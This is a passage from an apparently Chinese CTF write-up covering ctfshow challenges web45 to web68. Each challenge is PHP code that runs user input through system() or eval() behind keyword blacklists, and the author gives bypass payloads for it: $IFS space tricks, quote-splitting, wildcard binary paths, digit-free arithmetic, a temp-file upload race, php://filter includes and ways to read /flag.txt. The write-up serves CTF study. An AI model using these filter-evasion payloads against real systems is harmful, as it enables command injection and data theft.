id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤空格<br><code>$IFS$6</code> <code>$&#123;IFS&#125;``%09``$IFS``&lt;</code><br><code>?c=tac$IFS$6f*.php%0A</code><br><code>echo$IFS</code>tac$IFS*<code>%0A</code></p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤空格<br><code>$IFS$6</code> <code>$&#123;IFS&#125;``%09``$IFS``&lt;</code><br><code>nl&lt;fla&#39;&#39;g.php||</code><br><code>tac&lt;fla&#39;&#39;g.php||</code></p><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>&#39;&#39;``\</code>绕过flag<br><code>tac&lt;fla&#39;&#39;g.php||</code><br><code>nl&lt;fla&#39;&#39;g.php||</code></p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl$IFS/fla&#39;&#39;g||</code><br><code>?c=nl$IFS/fla/g||</code><br><code>?c=nl$&#123;IFS&#125;/fla&#39;&#39;g||</code></p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl$&#123;IFS&#125;fl\ag.php</code><br><code>?c=nl$&#123;IFS&#125;fl&#39;&#39;ag.php</code><br><code>?c=c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code></p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符匹配<code>/bin/cat </code><br><code>?c=/bin/?at$&#123;IFS&#125;f???????</code><br><code>uniq</code> 可检查文本文件中重复出现的行列，删除重复行并输出<br><code>?c=uniq$&#123;IFS&#125;f???.php</code><br><code>?c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt  </code> –&gt; <code>?c=uniq$&#123;IFS&#125;a.txt</code></p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了字母<br>匹配<code>?c=/bin/base64 flag.php </code><br><code>?c=/???/????64 ????.???</code></p><p>看p神文章<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br>构造html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;POST数据包POC&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;!--链接是当前打开的题目链接--&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/2.png"><br><img src="/mdimg/ctfshow77/3.png"><br>无需文件直接点提交抓包<br><img src="/mdimg/ctfshow77/4.png"><br>抓靶机的包然后改把上面的data粘贴过去<br><img src="/mdimg/ctfshow77/5.png"><br><img src="/mdimg/ctfshow77/6.png"><br><code>?c=.+/???/????????[@-[]</code><br><code>#!bin/sh</code></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>没过滤点，临时文件包含，条件竞争<br>同web55</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了点<br>用<code>$(())</code>和取反 构造数字<br><code>$(())</code>用作运算<br><img src="/mdimg/ctfshow77/7.png"><br>当内部为空时<code>$(())==0</code><br><img src="/mdimg/ctfshow77/8.png"><br>对0取反得到-1<br><code>$((~$(())))</code><br><img src="/mdimg/ctfshow77/9.png"><br>拼接可以得到-1-1=-2   <code>$(($((~$(())))$((~$(())))))</code><br><img src="/mdimg/ctfshow77/10.png"><br>以此内推</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">num=<span class="hljs-number">36</span><br>fuyi=<span class="hljs-string">&#x27;$((~$(())))&#x27;</span>  <span class="hljs-comment">#-1</span><br><span class="hljs-keyword">if</span>(num&gt;=<span class="hljs-number">0</span>):<br>    num=<span class="hljs-built_in">abs</span>(~(num))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$((~$((&#x27;</span>+fuyi*num+<span class="hljs-string">&#x27;))))&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    num=<span class="hljs-built_in">abs</span>(num)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$((&#x27;</span>+fuyi*num+<span class="hljs-string">&#x27;))&#x27;</span>)<br></code></pre></td></tr></table></figure><p>payload:<code>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code><br><img src="/mdimg/ctfshow77/11.png"><br><code>$&#123;_&#125;</code>显示上一个命令<br>当没有上一个命令时返回空  则<code>$(())==$(($&#123;_&#125;))</code><br>亦可根据此构造payload</p><h3 id="web58-web65"><a href="#web58-web65" class="headerlink" title="web58-web65"></a>web58-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了一些命令执行的函数<br><code>print_r(glob(&quot;*&quot;));</code>读取当前目录<br><code>c=eval($_POST[1]);&amp;1=system(&#39;ls&#39;);</code>套eval无法绕过</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">c=show<span class="hljs-constructor">_source(&#x27;<span class="hljs-params">flag</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br>c=highlight<span class="hljs-constructor">_file(&#x27;<span class="hljs-params">flag</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br>两函数等价<br></code></pre></td></tr></table></figure><p>include+伪协议<br><code>c=include($_POST[&#39;a&#39;]);&amp;a=php://filter/convert.base64-encode/resource=flag.php  </code><br><code>c=show_source(&#39;flag.php&#39;);</code><br><code>c=highlight_file(&#39;flag.php&#39;);</code></p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>include、show_source被过滤<br><code>c=highlight_file(&#39;flag.php&#39;);</code> –》》》$flag=”秀秀得了,这次不在这里”;<br><code>c=print_r(scandir(&#39;/&#39;));</code>或者 <code>var_dump(scandir(&#39;/&#39;));</code><br>回显</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Array ( <span class="hljs-selector-attr">[0]</span> =&gt; . <span class="hljs-selector-attr">[1]</span> =&gt; .. <span class="hljs-selector-attr">[2]</span> =&gt; <span class="hljs-selector-class">.dockerenv</span> <span class="hljs-selector-attr">[3]</span> =&gt; bin <span class="hljs-selector-attr">[4]</span> =&gt; dev <span class="hljs-selector-attr">[5]</span> =&gt; etc <span class="hljs-selector-attr">[6]</span> =&gt; flag<span class="hljs-selector-class">.txt</span> <span class="hljs-selector-attr">[7]</span> =&gt; home <span class="hljs-selector-attr">[8]</span> =&gt; lib <span class="hljs-selector-attr">[9]</span> =&gt; media <span class="hljs-selector-attr">[10]</span> =&gt; mnt <span class="hljs-selector-attr">[11]</span> =&gt; opt <span class="hljs-selector-attr">[12]</span> =&gt; proc <span class="hljs-selector-attr">[13]</span> =&gt; root <span class="hljs-selector-attr">[14]</span> =&gt; run <span class="hljs-selector-attr">[15]</span> =&gt; sbin <span class="hljs-selector-attr">[16]</span> =&gt; srv <span class="hljs-selector-attr">[17]</span> =&gt; sys <span class="hljs-selector-attr">[18]</span> =&gt; tmp <span class="hljs-selector-attr">[19]</span> =&gt; usr <span class="hljs-selector-attr">[20]</span> =&gt; <span class="hljs-selector-tag">var</span> ) <br></code></pre></td></tr></table></figure><p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>ban了<code>print_r</code><br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><p>进来直接ban了<code>highlight_file()</code><br>分析一下，源码应该跟上题一样<br><code>c=var_dump(scandir(&#39;/&#39;));</code>读到flag.txt<br><code>show_source</code>ban了<br><code>include</code>这次没ban<br><code>c=include(&#39;/flag.txt&#39;);</code><br>或者<br><code>c=require(&#39;/flag.txt&#39;);</code><br><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul><p>还有<code>c=readgzfile(&quot;/flag.txt&quot;); </code><br><img src="/mdimg/ctfshow77/12.png"></p><h3 